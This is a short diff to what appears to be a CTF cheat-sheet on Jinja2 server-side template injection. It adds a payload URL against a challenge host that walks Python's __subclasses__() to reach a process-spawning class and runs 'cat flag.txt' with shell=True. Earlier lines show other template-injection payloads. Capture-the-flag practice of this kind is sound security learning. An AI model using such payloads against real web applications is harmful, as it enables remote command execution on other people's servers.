@@ -44,3 +44,9 @@ Then inject the second payload : `{{config.from_object('os')}}
 {{help(object name)}}
 
 ```
+
+```py
+ctf payloads
+
+http://chall.battlectf.online:8085/?capital={{%20().__class__.__base__.__subclasses__()[354](%22cat%20flag.txt%22,%20shell=True,%20stdout=-1).communicate()[0].strip()}}
+```
